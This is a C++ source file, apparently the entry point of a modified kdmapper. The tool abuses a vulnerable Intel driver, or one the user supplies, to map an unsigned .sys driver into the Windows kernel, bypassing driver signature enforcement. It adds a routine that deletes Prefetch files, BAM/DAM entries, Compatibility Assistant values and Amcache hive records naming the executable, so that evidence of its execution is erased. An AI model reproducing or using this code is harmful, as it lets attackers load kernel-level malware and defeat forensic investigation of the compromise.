#ifndef KDLIBMODE

#include <Windows.h>
#include <string>
#include <vector>
#include <filesystem>
#include <memory>
#include <Sddl.h>

#include "kdmapper.hpp"
#include "utils.hpp"
#include "intel_driver.hpp"

LONG WINAPI SimplestCrashHandler(EXCEPTION_POINTERS* ExceptionInfo)
{
	if (intel_driver::hDevice)
		intel_driver::Unload();

	return EXCEPTION_EXECUTE_HANDLER;
}

static bool EnableTokenPrivilege(LPCWSTR privName) {
	HANDLE hToken = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return false;
	LUID luid;
	if (!LookupPrivilegeValueW(nullptr, privName, &luid)) {
		CloseHandle(hToken);
		return false;
	}
	TOKEN_PRIVILEGES tp = { 0 };
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	BOOL ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr);
	DWORD err = GetLastError();
	CloseHandle(hToken);
	return ok && err == ERROR_SUCCESS;
}

static void RecursiveDeleteSubkeys(HKEY hRoot, const wchar_t* needle_upper) {
	wchar_t subName[256];
	DWORD subNameLen = _countof(subName);
	std::vector<std::wstring> to_delete;
	for (DWORD i = 0; ; i++) {
		subNameLen = _countof(subName);
		LSTATUS st = RegEnumKeyExW(hRoot, i, subName, &subNameLen, nullptr, nullptr, nullptr, nullptr);
		if (st != ERROR_SUCCESS)
			break;
		std::wstring upper(subName);
		for (auto& c : upper) c = (wchar_t)towupper(c);
		if (upper.find(needle_upper) != std::wstring::npos)
			to_delete.push_back(subName);
	}
	for (const auto& k : to_delete) {
		RegDeleteTreeW(hRoot, k.c_str());
	}
}

static void ScrubAmcacheHive(const std::wstring& exeFilenameUpper) {
	EnableTokenPrivilege(SE_BACKUP_NAME);
	EnableTokenPrivilege(SE_RESTORE_NAME);

	std::wstring mountPoint = kdmUtils::GenerateCryptoRandomName(10, 14);
	const wchar_t* hivePath = L"C:\\Windows\\AppCompat\\Programs\\Amcache.hve";

	LSTATUS st = ERROR_SHARING_VIOLATION;
	for (int tries = 0; tries < 5 && st != ERROR_SUCCESS; tries++) {
		st = RegLoadKeyW(HKEY_LOCAL_MACHINE, mountPoint.c_str(), hivePath);
		if (st == ERROR_SHARING_VIOLATION || st == ERROR_ACCESS_DENIED)
			Sleep(100);
	}
	if (st != ERROR_SUCCESS)
		return;

	const wchar_t* roots[] = {
		L"\\Root\\InventoryApplicationFile",
		L"\\Root\\InventoryApplication",
		L"\\Root\\InventoryApplicationShortcut",
		L"\\Root\\InventoryDriverBinary",
		L"\\Root\\File",
	};
	for (auto r : roots) {
		std::wstring fullPath = mountPoint + r;
		HKEY hSub = NULL;
		if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, fullPath.c_str(), 0, KEY_READ | KEY_WRITE, &hSub) == ERROR_SUCCESS) {
			RecursiveDeleteSubkeys(hSub, exeFilenameUpper.c_str());
			RegCloseKey(hSub);
		}
	}

	RegUnLoadKeyW(HKEY_LOCAL_MACHINE, mountPoint.c_str());
}

static void CleanForensicTraces() {
	wchar_t exePath[MAX_PATH];
	if (!GetModuleFileNameW(nullptr, exePath, MAX_PATH))
		return;

	std::wstring exeName = std::filesystem::path(exePath).filename().wstring();
	for (auto& c : exeName) c = (wchar_t)towupper(c);

	try {
		for (auto& entry : std::filesystem::directory_iterator(L"C:\\Windows\\Prefetch")) {
			std::wstring fn = entry.path().filename().wstring();
			for (auto& c : fn) c = (wchar_t)towupper(c);
			if (fn.find(exeName) == 0 && fn.find(L".PF") != std::wstring::npos)
				DeleteFileW(entry.path().wstring().c_str());
		}
	} catch (...) {}

	HANDLE hToken = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		DWORD len = 0;
		GetTokenInformation(hToken, TokenUser, nullptr, 0, &len);
		if (len) {
			auto buf = std::make_unique<BYTE[]>(len);
			if (GetTokenInformation(hToken, TokenUser, buf.get(), len, &len)) {
				LPWSTR sid = nullptr;
				if (ConvertSidToStringSidW(reinterpret_cast<PTOKEN_USER>(buf.get())->User.Sid, &sid)) {
					wchar_t volRoot[MAX_PATH], devName[MAX_PATH];
					if (GetVolumePathNameW(exePath, volRoot, MAX_PATH)) {
						std::wstring vol(volRoot);
						if (!vol.empty() && vol.back() == L'\\') vol.pop_back();
						if (QueryDosDeviceW(vol.c_str(), devName, MAX_PATH)) {
							std::wstring devExe = std::wstring(devName) + (exePath + vol.size());

							const wchar_t* subkeys[] = {
								L"SYSTEM\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\",
								L"SYSTEM\\CurrentControlSet\\Services\\dam\\State\\UserSettings\\",
							};
							for (auto prefix : subkeys) {
								std::wstring keyPath = std::wstring(prefix) + sid;
								HKEY hKey;
								if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
									RegDeleteValueW(hKey, devExe.c_str());
									RegCloseKey(hKey);
								}
							}
						}
					}
					LocalFree(sid);
				}
			}
		}
		CloseHandle(hToken);
	}

	HKEY hCompat;
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store", 0, KEY_READ | KEY_WRITE, &hCompat) == ERROR_SUCCESS) {
		std::wstring exePathUpper(exePath);
		for (auto& c : exePathUpper) c = (wchar_t)towupper(c);
		wchar_t valName[1024];
		DWORD valNameLen;
		std::vector<std::wstring> doomed;
		for (DWORD i = 0; ; i++) {
			valNameLen = _countof(valName);
			if (RegEnumValueW(hCompat, i, valName, &valNameLen, nullptr, nullptr, nullptr, nullptr) != ERROR_SUCCESS)
				break;
			std::wstring vUpper(valName);
			for (auto& c : vUpper) c = (wchar_t)towupper(c);
			if (vUpper.find(exePathUpper) != std::wstring::npos || vUpper.find(exeName) != std::wstring::npos)
				doomed.push_back(valName);
		}
		for (const auto& v : doomed) RegDeleteValueW(hCompat, v.c_str());
		RegCloseKey(hCompat);
	}

	ScrubAmcacheHive(exeName);
}

int paramExists(const int argc, wchar_t** argv, const wchar_t* param) {
	size_t plen = wcslen(param);
	for (int i = 1; i < argc; i++) {
		if (wcslen(argv[i]) == plen + 1ull && _wcsicmp(&argv[i][1], param) == 0 && argv[i][0] == '/') {
			return i;
		}
		else if (wcslen(argv[i]) == plen + 2ull && _wcsicmp(&argv[i][2], param) == 0 && argv[i][0] == '-' && argv[i][1] == '-') {
			return i;
		}
	}
	return -1;
}

std::wstring getParamValue(const int argc, wchar_t** argv, const wchar_t* param) {
	int idx = paramExists(argc, argv, param);
	if (idx > 0 && idx + 1 < argc)
		return argv[idx + 1];
	return L"";
}

int wmain(const int argc, wchar_t** argv) {
	SetUnhandledExceptionFilter(SimplestCrashHandler);

	bool free = paramExists(argc, argv, L"free") > 0;
	bool indPagesMode = paramExists(argc, argv, L"indPages") > 0;
	bool passAllocationPtr = paramExists(argc, argv, L"PassAllocationPtr") > 0;
	bool copyHeader = paramExists(argc, argv, L"copy-header") > 0;

	std::wstring vulnPath = getParamValue(argc, argv, L"vuln");

	if (!vulnPath.empty()) {
		if (!std::filesystem::exists(vulnPath))
			return -1;
		intel_driver::vulnerableDriverPath = vulnPath;
	}

	int vulnIdx = paramExists(argc, argv, L"vuln");
	int vulnValIdx = (vulnIdx > 0 && vulnIdx + 1 < argc) ? vulnIdx + 1 : -1;

	int drvIndex = -1;
	for (int i = 1; i < argc; i++) {
		if (i == vulnIdx || i == vulnValIdx)
			continue;
		if (std::filesystem::path(argv[i]).extension().string().compare(".sys") == 0) {
			drvIndex = i;
			break;
		}
	}

	if (drvIndex <= 0)
		return -1;

	const std::wstring driver_path = argv[drvIndex];

	if (!std::filesystem::exists(driver_path))
		return -1;

	if (!NT_SUCCESS(intel_driver::Load()))
		return -1;

	std::vector<uint8_t> raw_image = { 0 };
	if (!kdmUtils::ReadFileToMemory(driver_path, &raw_image)) {
		intel_driver::Unload();
		CleanForensicTraces();
		return -1;
	}

	kdmapper::AllocationMode mode = kdmapper::AllocationMode::AllocatePool;

	if (indPagesMode)
		mode = kdmapper::AllocationMode::AllocateIndependentPages;

	NTSTATUS exitCode = 0;
	if (!kdmapper::MapDriver(raw_image.data(), 0, 0, free, !copyHeader, mode, passAllocationPtr, nullptr, &exitCode)) {
		intel_driver::Unload();
		CleanForensicTraces();
		return -1;
	}

	if (!NT_SUCCESS(intel_driver::Unload())) {
		CleanForensicTraces();
		return -1;
	}

	CleanForensicTraces();
	return 0;
}

#endif
